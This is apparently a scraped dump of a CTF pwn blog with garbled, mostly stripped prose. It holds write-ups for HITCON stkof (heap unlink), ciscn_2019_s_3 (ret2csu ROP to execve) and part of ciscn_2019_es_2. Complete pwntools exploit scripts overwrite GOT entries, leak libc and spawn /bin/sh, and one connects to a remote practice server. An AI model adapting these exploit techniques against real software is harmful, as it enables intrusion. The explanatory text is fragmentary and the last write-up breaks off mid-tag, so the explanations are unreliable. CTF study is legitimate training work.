FD-&gt;bk = BK;                                  </span><br><span class="line">    BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>unlink</p><p>64unlinkchunkP</p><p>chunk P </p><p>P-&gt;fd &#x3D; target addr -0x18</p><p>P-&gt;bk &#x3D; expect value</p><p>FD &#x3D; P-&gt;fd &#x3D; target-0x18</p><p>BK &#x3D; P-&gt;bk &#x3D; expect value</p><p><strong>FD-&gt;bk &#x3D; BK &gt;*(target-0x18+0x18)&#x3D;*(P-&gt;fd+0x18)&#x3D;BK&#x3D;expect value</strong>      </p><p><strong>BK-&gt;fd &#x3D; FD &gt;*(expect value+0x10)&#x3D;FD&#x3D;target-0x18&#x3D;P-&gt;fd</strong></p><p> if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0)) malloc_printerr (check_action, corrupted double-linked list, P, AV); </p><p>*(FD+0x18)&#x3D;P *(BK+0x10)&#x3D;P</p><p>fake_chunkchunk&#x3D;Pchunk Pfdbkunlink</p><p></p><ul><li>*(target)||*(P-&gt;fd+0x18)expect value||BK</li><li>*(expect value+0x10)||*(p-&gt;bk+10)target-0x18||P-&gt;fd</li><li>using after freehook</li></ul><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec stkof</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/stkof&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p></p><ul><li>allocbss0x602140</li><li>free</li><li>fill</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">fill</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  idx = atol(s);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  size = atoll(s);</span><br><span class="line">  ptr = globals[idx];</span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    size -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fill</p><p><strong>unlink_chunkglobalfd bk</strong></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>alloc(16)<br>alloc(32)<br>alloc(48)</p><p>alloc</p><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230314233831972.png" alt="image-20230314233831972"></p><p>alloc(16) setbuf mallocfgetprintf</p><p>chunk</p><h3 id="fill"><a href="#fill" class="headerlink" title="fill"></a>fill</h3><p></p><p>alloc(0x10)<br>alloc(0x30)<br>alloc(0x80)</p><p>unlinkchunk</p><p>chunkhead0x10fd bk0x100x100x30</p><p>freeunlinkfastbin0x80</p><ul><li>chunkheadp64(0x0)+p64(0x30)</li><li>fdbkFD-&gt;bk &#x3D; P &amp;&amp; BK-&gt;fd &#x3D; P<ul><li>globa</li><li>unlinkP&#x3D;0x0000000002c874500x602138fdFD-&gt;bk &#x3D; P</li><li><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315001634637.png" alt="image-20230315001634637"></li><li>0x602140bkBK-&gt;fd &#x3D; P</li><li><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315001757168.png" alt="image-20230315001757168"></li><li>FDbkBKfdunlinkFDfd</li></ul></li></ul><p>payload&#x3D;p64(0x0)+p64(0x31)+p64(head+16-0x18)+p64(head+16-0x10)+p64(0x00)+p64(0x6666)</p><p>unlinkchunkchunk3prevsizechunksize <strong>PREV_INUSE</strong></p><p>payload +&#x3D; p64(0x30)+p64(0x90)</p><p>chunk3 unlink</p><p></p><ul><li>fd+0x18&#x3D;0x602138+0x18&#x3D;0x602150bk&#x3D;0x602140</li><li>bk+0x10&#x3D;0x602140+0x10&#x3D;0x602150fd&#x3D;0x602138</li></ul><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315002921373.png" alt="image-20230315002921373"></p><p></p><h3 id="leakshell"><a href="#leakshell" class="headerlink" title="leakshell"></a>leakshell</h3><p>fill chunk2fill</p><p>payload &#x3D; p64(0)+p64(free_got)+p64(puts_got)+p64(atoi_got)</p><p>edit(2,len(payload),payload)</p><p>s[0]&#x3D;free_gots[1]&#x3D;puts_gots[2]&#x3D;atoi_got</p><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315005329559.png" alt="image-20230315005329559"></p><p>payload &#x3D; p64(puts_plt)<br>edit(0,len(payload),payload)<br>free(1)</p><p>freegotputs pltfree(1)&#x3D;&#x3D;puts(puts_got)</p><p>leaklibc</p><p>payload &#x3D; p64(system)<br>edit(2,len(payload),payload)</p><p>atoi_gotsystemchoice &#x3D; atoi(nptr);binshpayload &#x3D; &#x2F;bin&#x2F;sh\x00<br>io.sendline(payload)</p><p><img src="/2023/03/14/Unlink-2014-HITCON-stkof/image-20230315010413491.png" alt="image-20230315010413491"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./stkof&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b* 0x4009E6&#x27;)#alloc</span></span><br><span class="line">db(<span class="string">&#x27;b* 0x400AE3&#x27;</span>)<span class="comment">#edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BA7&#x27;) #free</span></span><br><span class="line">head=<span class="number">0x602140</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">payload=p64(<span class="number">0x0</span>)+p64(<span class="number">0x31</span>)+p64(head+<span class="number">16</span>-<span class="number">0x18</span>)+p64(head+<span class="number">16</span>-<span class="number">0x10</span>)+p64(<span class="number">0x00</span>)+p64(<span class="number">0x6666</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>chunkP</p><ul><li><p></p><blockquote><p>tartar-0x18fdFD+0x18&#x3D;Ptar-0x10bkBK+0x10&#x3D;P</p><p>tartar-0x18</p></blockquote></li><li><p></p><blockquote><p>tar1  tar2 tar1-0x18fdtar2-0x10bk</p><p>tar1tar2-0x10|bk</p><p>tar2tar1-0x18|fd</p></blockquote></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_s_3</title>
      <link href="/2023/03/13/ciscn-2019-s-3/"/>
      <url>/2023/03/13/ciscn-2019-s-3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://files.buuoj.cn/files/5f9ef7ea96325fa7c9301560afeec679/ciscn_s_3">https://files.buuoj.cn/files/5f9ef7ea96325fa7c9301560afeec679/ciscn_s_3</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn$ checksec ciscn_2019_s_3</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/ciscn_2019_s_3&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>mainvulnbuf</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004004ED</span><br><span class="line">.text:00000000004004ED                               ; __unwind &#123;</span><br><span class="line">.text:00000000004004ED 55                            push    rbp</span><br><span class="line">.text:00000000004004EE 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000004004F1 48 31 C0                      xor     rax, rax</span><br><span class="line">.text:00000000004004F4 BA 00 04 00 00                mov     edx, 400h                       ; count</span><br><span class="line">.text:00000000004004F9 48 8D 74 24 F0                lea     rsi, [rsp+buf]                  ; buf</span><br><span class="line">.text:00000000004004FE 48 89 C7                      mov     rdi, rax                        ; fd</span><br><span class="line">.text:0000000000400501 0F 05                         syscall                                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000400503 48 C7 C0 01 00 00 00          mov     rax, 1</span><br><span class="line">.text:000000000040050A BA 30 00 00 00                mov     edx, 30h ; &#x27;0&#x27;                  ; count</span><br><span class="line">.text:000000000040050F 48 8D 74 24 F0                lea     rsi, [rsp+buf]                  ; buf</span><br><span class="line">.text:0000000000400514 48 89 C7                      mov     rdi, rax                        ; fd</span><br><span class="line">.text:0000000000400517 0F 05                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000400519 C3                            retn</span><br><span class="line">.text:0000000000400519</span><br><span class="line">.text:0000000000400519                               vuln endp ; sp-analysis failed</span><br><span class="line">.text:0000000000400519</span><br><span class="line">.text:0000000000400519                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040051A 90                            db 90h</span><br><span class="line">.text:000000000040051B                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040051B 5D                            pop     rbp</span><br><span class="line">.text:000000000040051C C3                            retn</span><br></pre></td></tr></table></figure><p>gadget,3b&#x3D;59<code>#define __NR_execve 59</code>syscallshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004004D6                               public gadgets</span><br><span class="line">.text:00000000004004D6                               gadgets proc near</span><br><span class="line">.text:00000000004004D6                               ; __unwind &#123;</span><br><span class="line">.text:00000000004004D6 55                            push    rbp</span><br><span class="line">.text:00000000004004D7 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000004004DA 48 C7 C0 0F 00 00 00          mov     rax, 0Fh</span><br><span class="line">.text:00000000004004E1 C3                            retn</span><br><span class="line">.text:00000000004004E1</span><br><span class="line">.text:00000000004004E1                               gadgets endp ; sp-analysis failed</span><br><span class="line">.text:00000000004004E1</span><br><span class="line">.text:00000000004004E2                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004E2 48 C7 C0 3B 00 00 00          mov     rax, 3Bh ; &#x27;;&#x27;</span><br><span class="line">.text:00000000004004E9 C3                            retn</span><br><span class="line">.text:00000000004004E9</span><br><span class="line">.text:00000000004004E9                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004EA 90                            db 90h</span><br><span class="line">.text:00000000004004EB                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004EB 5D                            pop     rbp</span><br><span class="line">.text:00000000004004EC C3                            retn</span><br></pre></td></tr></table></figure><p>vulnretpop ebpebprethook&#x2F;bin&#x2F;sh string</p><p>vuln <code>mov     edx, 30h ; &#39;0&#39;</code>0x30buf0x10ebpebpbinsh</p><h2 id="ebp"><a href="#ebp" class="headerlink" title="ebp"></a>ebp</h2><p>s(b&#x2F;bin&#x2F;sh\x00.ljust(0x10,ba)+p64(ret_fun))</p><p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313004045662.png" alt="image-20230313004045662"></p><p>0x7ffed29ae4280x7ffed29ae310</p><p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313004213386.png" alt="image-20230313004213386"></p><p>vuln-0x118</p><h2 id="ret2cmu-getshell"><a href="#ret2cmu-getshell" class="headerlink" title="ret2cmu getshell"></a>ret2cmu getshell</h2><h3 id="first-way"><a href="#first-way" class="headerlink" title="first way"></a>first way</h3><p>padding&#x3D;b&#x2F;bin&#x2F;sh\x00.ljust(0x10,ba)<br>payload&#x3D;padding+p64(csu_end)+p64(0)*2+p64(ebp+0x50)+p64(0)*3+p64(csu_front)+p64(mov_rax)+p64(rdi)+p64(ebp)+p64(syscall)</p><p>execve(&#x2F;bin&#x2F;sh,0,0)</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sys_execve  59  rax</span><br><span class="line"> &quot;/bin/sh&quot;  rdi</span><br><span class="line"> 0   rsi</span><br><span class="line"> 0   rdx</span><br></pre></td></tr></table></figure><p>rax,rdi,rsi </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/pwn&gt; ROPgadget --binary &#x27;ciscn_2019_s_3&#x27; --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040059c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040059e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005a2 : pop r15 ; ret</span><br><span class="line">0x000000000040059b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040059f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400440 : pop rbp ; ret</span><br><span class="line">0x00000000004005a3 : pop rdi ; ret</span><br><span class="line">0x00000000004005a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040059d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004003a9 : ret</span><br></pre></td></tr></table></figure><p>rdxcmu</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">.text:0000000000400580 4C 89 EA                      mov     rdx, r13</span><br><span class="line">.text:0000000000400583 4C 89 F6                      mov     rsi, r14</span><br><span class="line">.text:0000000000400586 44 89 FF                      mov     edi, r15d</span><br><span class="line">.text:0000000000400589 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br><span class="line">.text:0000000000400589</span><br><span class="line">.text:000000000040058D 48 83 C3 01                   add     rbx, 1</span><br><span class="line">.text:0000000000400591 48 39 EB                      cmp     rbx, rbp</span><br><span class="line">.text:0000000000400594 75 EA                         jnz     short loc_400580</span><br><span class="line">.text:0000000000400594</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596                               loc_400596:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400596 48 83 C4 08                   add     rsp, 8</span><br><span class="line">.text:000000000040059A 5B                            pop     rbx</span><br><span class="line">.text:000000000040059B 5D                            pop     rbp</span><br><span class="line">.text:000000000040059C 41 5C                         pop     r12</span><br><span class="line">.text:000000000040059E 41 5D                         pop     r13</span><br><span class="line">.text:00000000004005A0 41 5E                         pop     r14</span><br><span class="line">.text:00000000004005A2 41 5F                         pop     r15</span><br><span class="line">.text:00000000004005A4 C3                            retn</span><br><span class="line">.text:00000000004005A4                               ; &#125; // starts at 400540</span><br></pre></td></tr></table></figure><p>40059Ardi0400580rdxrbxcall [r12+rbx*8]r12retmov_raxcall</p><p>call mov_ret</p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313005704624.png" alt="image-20230313005704624" style="zoom:67%;"><p>call add rbx,1</p><p> rbprbpcsu_frontcall [r12+rbx*8]&#x3D;call [r12+8]pop rdi</p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313005856293.png" alt="image-20230313005856293" style="zoom:67%;"><p>pop rdi call [r12+8] popretpayloadmov raxrop</p><h3 id="second-way"><a href="#second-way" class="headerlink" title="second way"></a>second way</h3><p>payload&#x3D;padding+p64(csu_end)+p64(0)+p64(1)+p64(ebp+0x50)+p64(0)+p64(0)+p64(0)+p64(csu_front)+p64(mov_rax)</p><p>payload+&#x3D;ba*48+p64(rdi)+p64(ebp)+p64(syscall)</p><p>ret2cmuebprbxcmp     rbx, rbpretpop rdi</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12_call,r13_a3,r14_a2,r15_a1,last_ret</span>):<span class="comment">#callr12call    qword ptr [r12+rbx*8]</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    rbx=0</span></span><br><span class="line"><span class="string">    rbp=1</span></span><br><span class="line"><span class="string">    r12= call the address in address</span></span><br><span class="line"><span class="string">    r13= rdx third argument</span></span><br><span class="line"><span class="string">    r14= rsi second argument</span></span><br><span class="line"><span class="string">    r15= edi first argument </span></span><br><span class="line"><span class="string">    last= ret address   </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=padding+fake_rbp+p64(cmu_end)+p64(rbx)+p64(rbp)+p64(r12_call)+p64(r13_a3)+p64(r14_a2)+p64(r15_a1)+p64(cmu_front)</span><br><span class="line">    payload+=fake_reg+p64(last_ret)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    <span class="comment">#fake_reg56</span></span><br></pre></td></tr></table></figure><img src="/2023/03/13/ciscn-2019-s-3/image-20230313011205443.png" alt="image-20230313011205443" style="zoom:67%;"><img src="/2023/03/13/ciscn-2019-s-3/image-20230313011338278.png" alt="image-20230313011338278" style="zoom:67%;"><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./ciscn_2019_s_3&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;29483&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line">db(<span class="string">&#x27;b *0x0400501&#x27;</span>)</span><br><span class="line">ret_fun=<span class="number">0x04004ED</span></span><br><span class="line">csu_end = <span class="number">0x040059A</span></span><br><span class="line">csu_front = <span class="number">0x0400580</span></span><br><span class="line">rdi=<span class="number">0x00000000004005a3</span></span><br><span class="line">syscall=<span class="number">0x400517</span></span><br><span class="line">mov_rax=<span class="number">0x4004E2</span></span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(ret_fun))</span><br><span class="line">r(<span class="number">0x20</span>)</span><br><span class="line">ebp=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x118</span></span><br><span class="line">p(<span class="string">&#x27;ebp&#x27;</span>,ebp)</span><br><span class="line">padding=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#first way</span></span><br><span class="line">payload=padding+p64(csu_end)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(ebp+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(csu_front)+p64(mov_rax)+p64(rdi)+p64(ebp)+p64(syscall)</span><br><span class="line"><span class="comment">#second way</span></span><br><span class="line"><span class="comment"># payload=padding+p64(csu_end)+p64(0)+p64(1)+p64(ebp+0x50)+p64(0)+p64(0)+p64(0)+p64(csu_front)+p64(mov_rax)</span></span><br><span class="line"><span class="comment"># payload+=b&#x27;a&#x27;*48+p64(rdi)+p64(ebp)+p64(syscall)</span></span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Ret2cmu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_2</title>
      <link href="/2023/03/12/ciscn-2019-es-2/"/>
      <url>/2023/03/12/ciscn-2019-es-2/</url>
      
        <content type="html"><![CDATA[<p><a href="https://files.buuoj.cn/files/3b1f1f64834cb78d6bafc0422ec4fbec/ciscn_2019_es_2">https://files.buuoj.cn/files/3b1f1f64834cb78d6bafc0422ec4fbec/ciscn_2019_es_2</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/BUU&gt; checksec ciscn_2019_es_2 </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/BUU/ciscn_2019_es_2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x8system</p><p>bssebp</p><h2 id="ebp"><a href="#ebp" class="headerlink" title="ebp"></a>ebp</h2><p>printfebp</p><p>padding&#x3D;ba*0x28<br>sa(bname?\n,padding)</p><img src="/2023/03/12/ciscn-2019-es-2/image-20230312195405528.png" alt="image-20230312195405528" style="zoom: 